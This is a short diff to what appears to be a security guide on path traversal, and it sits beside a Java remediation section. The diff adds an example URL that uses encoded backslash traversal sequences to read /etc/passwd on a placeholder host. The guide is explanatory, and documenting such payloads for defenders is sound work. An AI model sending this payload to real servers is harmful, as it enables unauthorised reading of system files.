@@ -9,6 +9,13 @@ file:///proc/self/cwd/
 ```
 
 
+## Path Traversal on HTTP path
+
+```http
+https://{HOST}/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd
+```
+
+
 ## Remediation
 
 ### Java
